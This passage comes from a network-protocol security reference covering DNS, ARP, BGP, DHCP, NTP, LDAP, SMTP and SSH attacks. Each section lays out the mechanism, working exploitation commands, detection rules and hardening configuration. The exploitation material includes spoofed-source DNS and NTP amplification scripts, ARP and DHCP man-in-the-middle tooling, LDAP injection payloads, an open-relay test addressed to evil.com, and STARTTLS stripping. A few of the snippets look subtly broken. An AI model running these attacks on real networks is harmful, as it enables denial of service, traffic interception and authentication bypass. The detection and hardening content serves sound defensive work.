  classtype:policy-violation; rev:1;)

alert dns any any -> any 53 (msg:"DNS Tunneling - TXT Record Query (potential C2)"; \
  dns.query; content:"|00 10|"; \
  threshold:type both, track by_src, count 50, seconds 60; \
  classtype:policy-violation; rev:1;)
```

Zeek script:
```zeek
@load base/frameworks/notice
@load base/frameworks/sumstats

module DNSTunnel;

export {
    redef enum Notice::Type += { DNS_Tunnel_Detected };
}

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {
    local labels = split_string(query, /\./);
    if ( |labels| > 2 ) {
        local subdomain = join_string_vec(labels[0:|labels|-2], ".");
        if ( |subdomain| > 50 ) {
            NOTICE([$note=DNS_Tunnel_Detected,
                    $msg=fmt("Long subdomain query from %s: %s (%d chars)",
                             c$id$orig_h, query, |subdomain|),
                    $conn=c]);
        }
    }
}
```

tcpdump capture for analysis:
```bash
# Capture DNS traffic for offline analysis
tcpdump -i eth0 -w dns_capture.pcap 'udp port 53'

# Filter for TXT queries (common tunneling record type)
tcpdump -r dns_capture.pcap -nn 'udp port 53' | grep -i 'TXT\?'

# Count unique subdomains per base domain
tshark -r dns_capture.pcap -T fields -e dns.qry.name \
  | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head -20
```

**Hardening.**

```bash
# Unbound — block specific record types commonly used for tunneling
server:
    local-zone: "." deny  # Override for specific zones only
    # Rate-limit queries per client
    ip-ratelimit: 100

# BIND — Response Rate Limiting
rate-limit {
    responses-per-second 10;
    window 5;
};

# Firewall — force DNS through local resolver only
# nftables
nft add rule inet filter forward ip daddr != 10.0.0.53 udp dport 53 drop
nft add rule inet filter forward ip daddr != 10.0.0.53 tcp dport 53 drop

# iptables
iptables -A FORWARD -p udp --dport 53 ! -d 10.0.0.53 -j DROP
iptables -A FORWARD -p tcp --dport 53 ! -d 10.0.0.53 -j DROP
```

### 6.4 DNS amplification / reflection

**Mechanism.** The attacker sends DNS queries with a spoofed source IP (the victim's IP) to open recursive resolvers. The resolvers send responses to the victim. Amplification occurs because DNS responses are larger than queries. The amplification factor depends on the record type:

| Record Type | Typical Amplification Factor |
|-------------|------------------------------|
| ANY         | 28-54x                       |
| TXT (large) | 10-20x                       |
| DNSSEC (signed) | 40-70x                  |
| RRSIG       | 20-30x                       |
| A           | 2-3x                         |

A 60-byte query producing a 3,400-byte DNSSEC response yields a ~57x amplification factor. With 10,000 open resolvers sending 10 Mbps each, the victim receives 100 Gbps of traffic.

**Exploitation.**

```bash
# Scapy — DNS amplification (PoC for authorized testing only)
python3 -c "
from scapy.all import *
target = '10.0.0.100'       # VICTIM IP (spoofed source)
resolvers = ['8.8.8.8']     # Open resolvers (for testing use your own)
for resolver in resolvers:
    pkt = IP(src=target, dst=resolver)/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname='example.com', qtype='ANY'))
    send(pkt, verbose=0)
"

# hping3 — UDP flood with spoofed source
hping3 --udp -p 53 -a VICTIM_IP --data 34 RESOLVER_IP --flood
```

**Detection.**

```
# Suricata — detect DNS amplification responses
alert dns any 53 -> $HOME_NET any (msg:"DNS Amplification - Large Response to Internal Host"; \
  dsize:>512; flow:to_client; \
  threshold:type both, track by_dst, count 100, seconds 10; \
  classtype:attempted-dos; rev:1;)
```

```bash
# Wireshark filter — large DNS responses
dns.flags.response == 1 && udp.length > 512

# tcpdump — monitor DNS response volume
tcpdump -i eth0 -nn 'src port 53 and udp[10:2] > 512' -c 1000
```

**Hardening.**

```bash
# Disable open recursion on BIND
options {
    recursion no;             # For authoritative-only servers
    # OR restrict recursion to trusted clients
    allow-recursion { 10.0.0.0/8; 192.168.0.0/16; };
};

# Disable ANY queries (BIND)
# RFC 8482 — use minimal-ANY
minimal-any yes;

# Linux — BCP38 (ingress filtering to prevent source IP spoofing)
# nftables
nft add rule inet filter input ip saddr { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 } \
  iif "eth0" drop  # Drop private source IPs on external interface

# Cisco IOS — uRPF (unicast reverse path forwarding)
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx
```

**CVEs/incidents.** The 2013 Spamhaus DDoS attack peaked at 300 Gbps using DNS amplification. The 2016 Dyn DNS attack (Mirai botnet) reached 1.2 Tbps.

### 6.5 DNS-over-HTTPS/TLS evasion

**Mechanism.** DNS-over-HTTPS (DoH, RFC 8484) and DNS-over-TLS (DoT, RFC 7858) encrypt DNS queries, defeating network-level DNS monitoring, filtering, and content policies. An attacker can configure malware to use DoH resolvers (e.g., `https://1.1.1.1/dns-query`, `https://dns.google/dns-query`), bypassing enterprise DNS monitoring entirely.

DoT uses port 853 (blockable). DoH uses port 443 (indistinguishable from normal HTTPS without deep inspection or TLS fingerprinting).

**Detection.**

```bash
# Block known DoT servers
iptables -A OUTPUT -p tcp --dport 853 -j DROP

# Block known DoH providers by IP (partial — easily evaded)
# Cloudflare DoH
iptables -A OUTPUT -d 1.1.1.1 -p tcp --dport 443 -j DROP
iptables -A OUTPUT -d 1.0.0.1 -p tcp --dport 443 -j DROP
# Google DoH
iptables -A OUTPUT -d 8.8.8.8 -p tcp --dport 443 -j DROP
iptables -A OUTPUT -d 8.8.4.4 -p tcp --dport 443 -j DROP

# TLS SNI-based blocking (nftables with SNI inspection)
# Requires DPI or proxy — blocking by IP alone is insufficient
```

Zeek detection:
```zeek
# Detect DNS-over-TLS connections (port 853)
event connection_established(c: connection) {
    if ( c$id$resp_p == 853/tcp )
        NOTICE([$note=DNS::DNS_over_TLS_Detected,
                $msg=fmt("DoT connection from %s to %s",
                         c$id$orig_h, c$id$resp_h),
                $conn=c]);
}
```

**Hardening.** Force all DNS through enterprise resolver. Deploy SSL/TLS inspection proxy for DoH detection. Use endpoint agents that enforce DNS policy regardless of transport.

---

## 7. ARP attacks

### 7.1 ARP spoofing / cache poisoning

**Mechanism.** ARP (Address Resolution Protocol, RFC 826) maps IPv4 addresses to MAC addresses on a local network segment. ARP has no authentication — any host can send an ARP reply claiming to own any IP address. ARP spoofing sends unsolicited ARP replies (or replies to legitimate ARP requests) associating the attacker's MAC address with a target IP (typically the default gateway). All traffic from victims to the gateway is then sent to the attacker's MAC, enabling MitM.

The ARP cache on most operating systems accepts unsolicited ARP replies (Gratuitous ARP / GARP). GARP is legitimately used for IP failover and duplicate address detection, but it provides the attack vector.

**Exploitation.**

```bash
# arpspoof (dsniff suite) — redirect traffic between victim and gateway
# Terminal 1: tell victim that attacker is the gateway
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: tell gateway that attacker is the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Enable IP forwarding to maintain connectivity
sudo sysctl -w net.ipv4.ip_forward=1

# Bettercap — modern ARP spoofing with caplet automation
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set net.sniff.local true; net.sniff on"

# Bettercap — full-duplex ARP MitM with HTTPS stripping
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack

# Ettercap — GUI or CLI ARP MitM
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Scapy — ARP spoofing script
python3 -c "
from scapy.all import *
import time

target_ip = '192.168.1.100'
gateway_ip = '192.168.1.1'
attacker_mac = get_if_hwaddr('eth0')

def spoof(target, spoof_as):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
        op=2, pdst=target, psrc=spoof_as, hwsrc=attacker_mac)
    sendp(pkt, verbose=0)

while True:
    spoof(target_ip, gateway_ip)   # Tell victim: attacker is gateway
    spoof(gateway_ip, target_ip)   # Tell gateway: attacker is victim
    time.sleep(2)
"
```

**Detection.**

```bash
# arpwatch — monitor ARP table changes
sudo arpwatch -i eth0 -d -f /var/lib/arpwatch/arp.dat
# Logs "flip flop" entries when MAC-IP bindings change rapidly

# arpalert — real-time ARP anomaly detection
sudo arpalert -i eth0

# Wireshark filters
arp.duplicate-address-detected
arp.opcode == 2  # ARP replies — look for unsolicited
arp.src.hw_mac != arp.dst.hw_mac  # MAC mismatches

# tcpdump — capture ARP traffic
tcpdump -i eth0 -nn arp
tcpdump -i eth0 -nn 'arp and arp[6:2] == 2'  # ARP replies only
```

Suricata rules:
```
alert arp any any -> any any (msg:"ARP Spoofing - Duplicate IP-MAC Binding Detected"; \
  arp.opcode:2; threshold:type both, track by_src, count 50, seconds 10; \
  classtype:attempted-admin; rev:1;)
```

**Hardening.**

```bash
# Linux — static ARP entries for critical infrastructure (gateway)
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Cisco IOS — Dynamic ARP Inspection (DAI)
ip arp inspection vlan 10,20,30
interface GigabitEthernet0/1
 ip arp inspection trust            ! Uplink to trusted switch/router

interface range GigabitEthernet0/2-48
 ip arp inspection limit rate 15    ! Rate-limit ARP on access ports
 no ip arp inspection trust         ! Untrusted by default

# Cisco IOS — DHCP snooping (prerequisite for DAI)
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
interface GigabitEthernet0/1
 ip dhcp snooping trust

# Juniper JunOS — DAI equivalent
set ethernet-switching-options secure-access-port vlan v10 arp-inspection

# Linux nftables — rate-limit ARP
nft add table arp filter
nft add chain arp filter input '{ type filter hook input priority 0; policy accept; }'
nft add rule arp filter input arp operation reply limit rate 10/second accept
nft add rule arp filter input arp operation reply drop
```

### 7.2 Gratuitous ARP (GARP) attacks

**Mechanism.** GARP is an ARP reply sent without a corresponding ARP request, or an ARP request where source and destination IP are the same. Legitimately used for IP failover (HSRP/VRRP), NIC replacement, and duplicate address detection. An attacker sends GARP frames to update all ARP caches on the segment simultaneously — more efficient than targeted ARP spoofing.

**Exploitation.**

```bash
# Scapy — GARP broadcast
python3 -c "
from scapy.all import *
# Claim to be the gateway
sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=1, psrc='192.168.1.1', pdst='192.168.1.1',
    hwsrc=get_if_hwaddr('eth0')), iface='eth0', count=5)
"
```

**Detection.** Same as ARP spoofing — arpwatch detects GARP as "flip flop" events. DAI validates GARP against the DHCP snooping binding table.

---

## 8. BGP attacks

### 8.1 BGP prefix hijacking

**Mechanism.** BGP (Border Gateway Protocol) is the inter-domain routing protocol. BGP peers exchange prefix announcements: "AS X can reach prefix Y/Z via path [AS_PATH]." BGP has no built-in authentication of prefix ownership. A malicious or misconfigured AS can announce a prefix it doesn't own — all downstream ASes will route traffic for that prefix to the hijacker.

**Sub-prefix hijacking.** If the legitimate owner announces `208.65.152.0/22`, the attacker announces `208.65.153.0/24` (a more specific prefix). BGP's longest-prefix-match routing ensures the more specific route wins globally. The legitimate /22 still exists but is overridden for the /24 subnet.

**AS-path prepending manipulation.** An attacker shortens their AS path to make their route appear shorter (and thus preferred) compared to the legitimate route.

**Route leaks.** An AS inadvertently or maliciously re-advertises routes learned from one peer to another in violation of routing policy (e.g., a customer AS advertising transit routes, making itself a transit provider and attracting traffic it can't handle).

**Real-world incidents.**

| Date | Incident | Mechanism | Impact |
|------|----------|-----------|--------|
| 2008-02-24 | Pakistan Telecom / YouTube | AS17557 announced `208.65.153.0/24` (YouTube's /22 subprefix) | YouTube globally unreachable for ~2 hours |
| 2018-04 | Amazon Route 53 hijack | BGP hijack of `205.251.192.0/24` and `205.251.193.0/24` | MyEtherWallet users redirected to phishing site, ~$150k in ETH stolen |
| 2020 | Russian Rostelecom hijacks | Multiple prefix hijacks of Google, AWS, Cloudflare prefixes | Traffic for major services routed through Russian AS |
| 2022-04 | Russia hijack of Twitter, Facebook | AS announcements for Twitter/Facebook prefixes during Russia-Ukraine conflict | Temporary traffic redirection |

**Detection.**

```bash
# BGP Stream (RIPEstat) — monitor BGP announcements for your prefixes
# Real-time API
curl -s "https://stat.ripe.net/data/bgp-updates/data.json?resource=208.65.152.0/22&starttime=2024-01-01T00:00"

# BGPStream (CAIDA) — programmatic BGP monitoring
pip install pybgpstream
python3 -c "
import pybgpstream
stream = pybgpstream.BGPStream(
    from_time='2024-01-01 00:00:00',
    until_time='2024-01-02 00:00:00',
    collectors=['rrc00','route-views2'],
    record_type='updates',
    filter='prefix more 208.65.152.0/22'
)
for rec in stream.records():
    for elem in rec:
        print(elem.type, elem.peer_asn, elem.fields)
"

# RIPE RIS Live — real-time BGP monitoring via WebSocket
# Subscribe to announcements for your prefix
```

**Hardening — RPKI/ROA deployment.**

```bash
# Create ROA (Route Origin Authorization) via RIR portal
# Example ROA: "AS13335 is authorized to originate 104.16.0.0/12 with maxLength /24"

# Routinator — RPKI validator
routinator init
routinator server --rtr 0.0.0.0:3323 --http 0.0.0.0:8323

# Cisco IOS — configure RPKI-based route filtering
router bgp 65001
 rpki server tcp 10.0.0.10 port 3323 refresh 300

route-map RPKI-FILTER permit 10
 match rpki valid
route-map RPKI-FILTER permit 20
 match rpki not-found
 set local-preference 50
route-map RPKI-FILTER deny 30
 match rpki invalid

router bgp 65001
 neighbor 10.0.0.2 route-map RPKI-FILTER in

# Juniper JunOS — RPKI validation
routing-options {
    validation {
        group rpki-validators {
            session 10.0.0.10 {
                port 3323;
                refresh-time 300;
            }
        }
    }
}
policy-options {
    policy-statement rpki-policy {
        term valid {
            from {
                protocol bgp;
                validation-database valid;
            }
            then accept;
        }
        term invalid {
            from {
                protocol bgp;
                validation-database invalid;
            }
            then reject;
        }
    }
}
```

### 8.2 BGP Flowspec for DDoS mitigation

**Mechanism.** BGP Flowspec (RFC 5575) distributes traffic filtering rules via BGP. An AS can announce flow specifications that match on source/destination IP, protocol, port, packet length, DSCP, fragment flags. Downstream routers implement the rules as ACLs, providing distributed DDoS filtering at the network edge.

```
# Cisco IOS — BGP Flowspec to drop UDP amplification traffic
router bgp 65001
 address-family ipv4 flowspec
  neighbor 10.0.0.2 activate

flowspec
 address-family ipv4
  flow src-prefix 0.0.0.0/0
       dst-prefix 10.0.0.100/32
       proto udp
       src-port =53
       pkt-len >512
  match action drop
```

---

## 9. DHCP attacks

### 9.1 DHCP starvation

**Mechanism.** The attacker exhausts the DHCP server's IP address pool by sending DHCP Discover messages with spoofed MAC addresses. Each Discover triggers a DHCP Offer and consumes an IP lease. Once the pool is exhausted, legitimate clients cannot obtain IP addresses.

**Exploitation.**

```bash
# Yersinia — DHCP starvation (sends DHCP Discover flood)
sudo yersinia dhcp -attack 1 -interface eth0

# DHCPig — more sophisticated DHCP exhaustion
sudo pig.py eth0

# Scapy — DHCP starvation script
python3 -c "
from scapy.all import *
import random

conf.checkIPsrc = False
for i in range(254):
    mac = RandMAC()
    dhcp_discover = (
        Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=[mac_to_bytes(mac)]) /
        DHCP(options=[('message-type','discover'), 'end'])
    )
    sendp(dhcp_discover, iface='eth0', verbose=0)

def mac_to_bytes(mac_str):
    return bytes.fromhex(mac_str.replace(':',''))
"

# Nmap — DHCP discovery
nmap --script broadcast-dhcp-discover
```

**Detection.**

```bash
# Wireshark filter
bootp.type == 1 && bootp.option.type == 53 && bootp.option.value == 01
# High volume of DHCP Discover from unique MACs

# tcpdump
tcpdump -i eth0 -nn 'udp port 67 or udp port 68'
```

Suricata rules:
```
alert udp any 68 -> 255.255.255.255 67 (msg:"DHCP Starvation - High Volume Discover"; \
  content:"|01|"; offset:0; depth:1; \
  threshold:type both, track by_src, count 50, seconds 10; \
  classtype:attempted-dos; rev:1;)
```

### 9.2 Rogue DHCP server

**Mechanism.** After exhausting the legitimate DHCP server's pool (or independently), the attacker sets up a rogue DHCP server that assigns IP addresses with the attacker's machine as the default gateway and DNS server. All client traffic is then routed through and resolved by the attacker — complete MitM.

**Exploitation.**

```bash
# Yersinia — rogue DHCP server
sudo yersinia dhcp -attack 2 -interface eth0

# Bettercap — DHCP spoofing
sudo bettercap -iface eth0 -eval "set dhcp6.spoof.domains target.com; dhcp6.spoof on"

# Metasploit — rogue DHCP
use auxiliary/server/dhcp
set SRVHOST 0.0.0.0
set NETMASK 255.255.255.0
set DHCPIPSTART 192.168.1.100
set DHCPIPEND 192.168.1.200
set ROUTER 192.168.1.50          # Attacker as gateway
set DNSSERVER 192.168.1.50       # Attacker as DNS
run
```

**Hardening — DHCP snooping.**

```
# Cisco IOS — DHCP snooping (fundamental L2 security)
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
ip dhcp snooping verify mac-address

! Trust only uplink ports connected to legitimate DHCP server
interface GigabitEthernet0/1
 ip dhcp snooping trust

! All access ports are untrusted by default
interface range GigabitEthernet0/2-48
 ip dhcp snooping limit rate 10     ! Max 10 DHCP packets/second

! Enable Option 82 (relay agent information)
ip dhcp snooping information option

# Juniper JunOS — DHCP snooping
set ethernet-switching-options secure-access-port vlan v10 dhcp-snooping
set interfaces ge-0/0/0 unit 0 family ethernet-switching dhcp-trusted

# Linux — detect rogue DHCP with dhcptest
dhcptest -i eth0 --query
# Compare responses — multiple servers indicate rogue
```

---

## 10. NTP attacks

### 10.1 NTP amplification

**Mechanism.** NTP (Network Time Protocol) supports a monitoring command (`monlist` / mode 7) that returns the list of the last 600 clients that queried the server. A single 234-byte request can produce ~100 response packets totaling ~48,000 bytes — an amplification factor of ~206x (one of the highest among UDP protocols). The attacker sends `monlist` requests with a spoofed source IP (the victim's IP) to vulnerable NTP servers.

**Exploitation.**

```bash
# Test for monlist support
ntpdc -n -c monlist TARGET_NTP_SERVER

# nmap — check for NTP monlist
nmap -sU -p 123 --script ntp-monlist TARGET_NTP_SERVER

# Scapy — NTP monlist amplification (PoC, authorized testing only)
python3 -c "
from scapy.all import *
# Mode 7, implementation-specific command 42 (MON_GETLIST_1)
ntp_monlist = (
    b'\x17\x00\x03\x2a' + b'\x00' * 4  # NTP mode 7 header
)
pkt = IP(src='VICTIM_IP', dst='NTP_SERVER')/UDP(sport=12345, dport=123)/Raw(load=ntp_monlist)
send(pkt, verbose=0)
"
```

**Detection.**

```
# Suricata — NTP monlist request detection
alert udp any any -> any 123 (msg:"NTP Monlist Request - Amplification Vector"; \
  content:"|17 00 03 2a|"; offset:0; depth:4; \
  classtype:attempted-dos; rev:1;)

# Suricata — NTP amplification response flood
alert udp any 123 -> $HOME_NET any (msg:"NTP Amplification Response Flood"; \
  dsize:>440; threshold:type both, track by_dst, count 100, seconds 10; \
  classtype:attempted-dos; rev:1;)
```

```bash
# Wireshark filter
ntp.priv.reqcode == 42  # monlist request
ntp && udp.length > 440  # large NTP responses
```

**Hardening.**

```bash
# ntpd — disable monlist (ntp.conf)
restrict default nomodify notrap nopeer noquery
restrict -6 default nomodify notrap nopeer noquery
disable monitor

# chrony (modern replacement — no monlist support)
# /etc/chrony/chrony.conf
server ntp.ubuntu.com iburst
driftfile /var/lib/chrony/chrony.drift
makestep 1.0 3
rtcsync

# Cisco IOS — NTP ACL
access-list 10 permit 10.0.0.0 0.255.255.255
ntp access-group peer 10
ntp access-group serve-only 10

# Firewall — rate-limit NTP
iptables -A INPUT -p udp --sport 123 -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p udp --sport 123 -j DROP
```

### 10.2 NTP Delorean attack

**Mechanism.** An attacker who can MitM NTP traffic can manipulate the victim's system clock. Shifting time forward causes TLS certificate validation to accept expired certificates or reject valid ones. Shifting time backward can make revoked certificates appear valid (pre-CRL issuance), break Kerberos (which requires 5-minute clock accuracy), force HSTS expiry, or reset TOTP windows.

**Exploitation.**

```bash
# Delorean — NTP MitM tool
git clone https://github.com/PentesterES/Delorean
python3 Delorean/delorean.py -i eth0 -s '2020-01-01 00:00:00'

# Bettercap + NTP interception
# First ARP spoof, then modify NTP responses in transit
```

**Hardening.**

```bash
# NTP authentication — symmetric keys (/etc/ntp.keys)
# Key format: keyid type key
1 SHA1 mysecretkey123456

# ntp.conf — require authentication
keys /etc/ntp.keys
trustedkey 1
server ntp.ubuntu.com key 1

# NTS (Network Time Security, RFC 8915) — chrony 4.0+
# /etc/chrony/chrony.conf
server time.cloudflare.com iburst nts
ntstrustedcerts /etc/chrony/nts-certs.pem

# Block external NTP and force internal server
iptables -A OUTPUT -p udp --dport 123 ! -d 10.0.0.53 -j DROP
```

**CVEs.** CVE-2015-7704 (ntpd kiss-of-death packet causing clock step). CVE-2013-5211 (monlist amplification — patched in NTP 4.2.7p26).

---

## 11. LDAP injection

### 11.1 Mechanism

LDAP injection exploits applications that construct LDAP search filters from unsanitized user input. LDAP filters use prefix notation: `(&(uid=USER)(password=PASS))`. If the application inserts user input directly into the filter, the attacker can manipulate the filter logic.

**Filter syntax abuse.**

```
# Normal filter
(&(uid=john)(password=secret))

# Injected username: john)(|(password=*
# Resulting filter:
(&(uid=john)(|(password=*))(password=wrong))
# The OR condition (|(password=*)) matches any password

# Injected username: *)(uid=*))(|(uid=*
# Resulting filter:
(&(uid=*)(uid=*))(|(uid=*)(password=anything))
# Matches all users regardless of password
```

### 11.2 Blind LDAP injection

When the application doesn't return LDAP data directly, the attacker infers information through boolean responses (login success/failure):

```
# Extract admin password character by character
# Username: admin)(password=a*    → login fails
# Username: admin)(password=b*    → login fails
# Username: admin)(password=s*    → login succeeds → first char is 's'
# Username: admin)(password=se*   → login succeeds → second char is 'e'
```

### 11.3 Filter bypass techniques

```
# Null byte injection (older implementations)
uid=admin%00)(password=anything

# Unicode normalization bypass
# Some implementations normalize unicode before filter construction
uid=aDmIn  (case variation if backend is case-insensitive)

# Wildcard exploitation
uid=*       # Match all users
uid=a*      # Match users starting with 'a'
uid=*admin* # Match users containing 'admin'
```

**Detection.**

```bash
# Wireshark — monitor LDAP bind attempts
ldap.bindRequest && ldap.authentication == 0  # Simple bind
ldap.filter contains "*"                       # Wildcard in filter

# Suricata — LDAP injection attempt
alert tcp any any -> any 389 (msg:"LDAP Injection - Filter Metacharacter in Bind"; \
  content:"|30|"; content:")(|"; distance:0; within:100; \
  classtype:web-application-attack; rev:1;)
```

**Hardening.**

```bash
# Application-level: use parameterized LDAP queries (framework-specific)
# Never concatenate user input into LDAP filters

# Enforce LDAP signing (Windows AD)
# GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
#   Local Policies → Security Options →
#   "Domain controller: LDAP server signing requirements" = "Require signing"
#   "Network security: LDAP client signing requirements" = "Require signing"

# Registry (direct):
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" \
  /v LDAPServerIntegrity /t REG_DWORD /d 2 /f

# LDAP channel binding (Windows Server 2019+)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" \
  /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f

# Require LDAPS (port 636) instead of LDAP (port 389)
# Cisco ISE / RADIUS — configure LDAP over TLS
```

---

## 12. SMTP attacks

### 12.1 SMTP relay abuse

**Mechanism.** An open SMTP relay accepts email from any sender to any recipient, allowing attackers to send spam, phishing, or malware through the relay server. The attacker's source IP is hidden behind the relay's IP.

**Exploitation.**

```bash
# Test for open relay
nmap --script smtp-open-relay -p 25 target.com

# Manual relay test via telnet
telnet target.com 25
EHLO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>
DATA
Subject: Test relay
This is a relay test.
.
QUIT

# swaks — SMTP testing tool
swaks --to victim@external.com --from attacker@evil.com \
  --server target.com --port 25
```

**Hardening.**

```bash
# Postfix — restrict relay
# /etc/postfix/main.cf
smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination
mynetworks = 127.0.0.0/8, 10.0.0.0/8

# Sendmail — close open relay
# /etc/mail/access
Connect:localhost   RELAY
Connect:10.0.0     RELAY
# All others implicitly rejected
```

### 12.2 Email spoofing — SPF/DKIM/DMARC bypass

**Mechanism.** SPF (Sender Policy Framework) lists authorized mail servers in a DNS TXT record. DKIM (DomainKeys Identified Mail) adds a cryptographic signature header. DMARC (Domain-based Message Authentication Reporting and Conformance) aligns SPF and DKIM with the From: header domain and specifies a policy (none/quarantine/reject).

**Bypass techniques.**

```
# SPF bypass via subdomain
# target.com has strict SPF, but sub.target.com may not
MAIL FROM:<attacker@sub.target.com>
# If sub.target.com has no SPF record, SPF check returns "none" (not fail)

# DKIM bypass via unsigned headers
# Add additional From: headers (some parsers use the last one)
# DKIM signs specific headers — additional unsigned headers may be rendered

# DMARC bypass via organizational domain confusion
# DMARC aligns on organizational domain — subdomains with sp=none are exploitable

# Null sender bypass
MAIL FROM:<>
# Null sender (bounce messages) bypasses SPF in some implementations
```

**Detection.**

```bash
# Verify SPF/DKIM/DMARC for a domain
dig +short TXT target.com | grep spf
dig +short TXT _dmarc.target.com
dig +short TXT default._domainkey.target.com

# swaks — test DKIM validation
swaks --to test@target.com --from spoofed@target.com \
  --header "From: CEO <ceo@target.com>" --server mx.target.com

# Monitor DMARC reports (aggregate)
# Configure DMARC record with rua= for aggregate reports
# _dmarc.target.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.com; pct=100"
```

### 12.3 STARTTLS stripping

**Mechanism.** SMTP STARTTLS is an opportunistic upgrade — the client sends `EHLO`, the server advertises `250-STARTTLS`, and the client sends `STARTTLS` to upgrade to TLS. An active MitM can strip the `250-STARTTLS` from the server's response, forcing the connection to remain plaintext. The client proceeds without encryption (opportunistic TLS does not mandate it).

**Exploitation.**

```bash
# Bettercap — STARTTLS stripping (after ARP MitM)
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"
# Custom proxy to strip STARTTLS from EHLO responses

# Manual with socat
socat TCP-LISTEN:2525,fork TCP:mx.target.com:25 | \
  sed 's/250-STARTTLS/250-XXXXXXXX/'
```

**Hardening.**

```bash
# Postfix — enforce TLS (mandatory, not opportunistic)
# /etc/postfix/main.cf
smtpd_tls_security_level = encrypt        # Require TLS for inbound
smtp_tls_security_level = verify           # Verify TLS for outbound
smtp_tls_mandatory_protocols = >=TLSv1.2

# MTA-STS (SMTP MTA Strict Transport Security, RFC 8461)
# Publish MTA-STS policy via HTTPS:
# https://mta-sts.target.com/.well-known/mta-sts.txt
# version: STSv1
# mode: enforce
# mx: mx.target.com
# max_age: 604800

# DNS record for MTA-STS
# _mta-sts.target.com TXT "v=STSv1; id=20240101"

# DANE (DNS-Based Authentication of Named Entities)
# Publish TLSA record for mail server
# _25._tcp.mx.target.com TLSA 3 1 1 <SHA-256 hash of cert>
```

---

## 13. SSH attacks

### 13.1 SSH downgrade attacks

**Mechanism.** SSH negotiates key exchange, host key, encryption, and MAC algorithms during the handshake. An active MitM can modify the algorithm lists in the SSH_MSG_KEXINIT to force negotiation of weaker algorithms. Older SSH implementations may support vulnerable algorithms: `ssh-dss` (1024-bit DSA), `diffie-hellman-group1-sha1` (1024-bit DH), `arcfour` (RC4), `hmac-md5`.

**Detection and auditing.**

```bash
# ssh-audit — comprehensive SSH server/client auditing
ssh-audit target.com:22

# ssh-audit output includes:
# - Algorithm support and grade (FAIL/WARN/GOOD/INFO)
# - CVE matching
# - Policy compliance checks
# - Recommendations

# nmap — SSH algorithm enumeration
nmap --script ssh2-enum-algos -p 22 target.com

# Test specific algorithm negotiation
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 target.com  # Should fail
ssh -o Ciphers=arcfour target.com                           # Should fail
```

### 13.2 Terrapin attack (CVE-2023-48795)

**Mechanism.** The Terrapin attack targets the SSH Binary Packet Protocol, exploiting a sequence number manipulation vulnerability during the handshake. The attack is a prefix truncation — the attacker can delete messages from the beginning of the encrypted channel without either side detecting it.

The vulnerability affects two cipher modes:

1. **ChaCha20-Poly1305** (`chacha20-poly1305@openssh.com`): The most common SSH cipher. The sequence number is used as the nonce for ChaCha20. By deleting the first encrypted packet (SSH_MSG_EXT_INFO from the server), the attacker desynchronizes the sequence numbers. The client and server disagree on the sequence counter, but both produce valid MACs because the sequence number is implicit (not transmitted).

2. **CBC with Encrypt-then-MAC** (`*-cbc` ciphers with `*-etm@openssh.com` MACs): Similar prefix truncation is possible because the ETM construction uses a separate sequence counter that can be manipulated.

The practical impact: the attacker can disable SSH extension negotiation (`SSH_MSG_EXT_INFO`), which disables keystroke timing obfuscation and other security extensions. In some configurations, the attacker can downgrade the authentication method.

**Detection.**

```bash
# Terrapin vulnerability scanner
pip install ssh-audit
ssh-audit --json target.com:22 | python3 -c "
import sys, json
data = json.load(sys.stdin)
for algo in data.get('kex', []):
    if 'terrapin' in str(algo.get('notes', '')).lower():
        print(f'VULNERABLE: {algo[\"algorithm\"]}')
"

# Specific check for vulnerable cipher combinations
ssh -Q cipher | grep -E 'chacha20-poly1305|cbc'
ssh -Q mac | grep etm
```

**Hardening — sshd_config.**

```bash
# /etc/ssh/sshd_config — hardened configuration

# Protocol version (SSH-2 only — SSH-1 is ancient and broken)
Protocol 2

# Key exchange — strict kex (Terrapin mitigation)
# OpenSSH 9.6+ supports strict key exchange
KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512

# Host key algorithms
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256

# Ciphers — remove ChaCha20-Poly1305 if OpenSSH < 9.6 (no strict kex)
# With OpenSSH 9.6+, ChaCha20-Poly1305 is safe with strict kex
Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr

# MACs — avoid ETM with CBC (Terrapin)
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com

# Authentication hardening
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin prohibit-password
AuthenticationMethods publickey
MaxAuthTries 3
LoginGraceTime 30

# Disable unused features
X11Forwarding no
AllowTcpForwarding no
AllowAgentForwarding no
PermitTunnel no

# Logging
